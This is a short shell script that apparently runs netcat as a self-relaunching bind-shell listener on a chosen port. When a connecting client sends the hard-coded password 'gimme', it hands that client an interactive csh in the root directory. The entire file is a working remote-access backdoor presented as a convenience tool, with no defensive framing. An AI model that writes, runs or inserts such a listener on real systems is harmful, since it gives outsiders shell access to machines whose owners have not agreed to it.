#! /bin/sh
## a little wrapper to "password" and re-launch a shell-listener.
## Arg is taken as the port to listen on.  Define "NC" to point wherever.

NC=nc

case "$1" in
  ?* )
  LPN="$1"
  export LPN
  sleep 1
  echo "-l -p $LPN -e $0" | $NC > /dev/null 2>&1 &
  echo "launched on port $LPN"
  exit 0
  ;;
esac

# here we play inetd
echo "-l -p $LPN -e $0" | $NC > /dev/null 2>&1 &

while read qq ; do
case "$qq" in
# here's yer password
  gimme )
  cd /
  exec csh -i
  ;;
esac
done
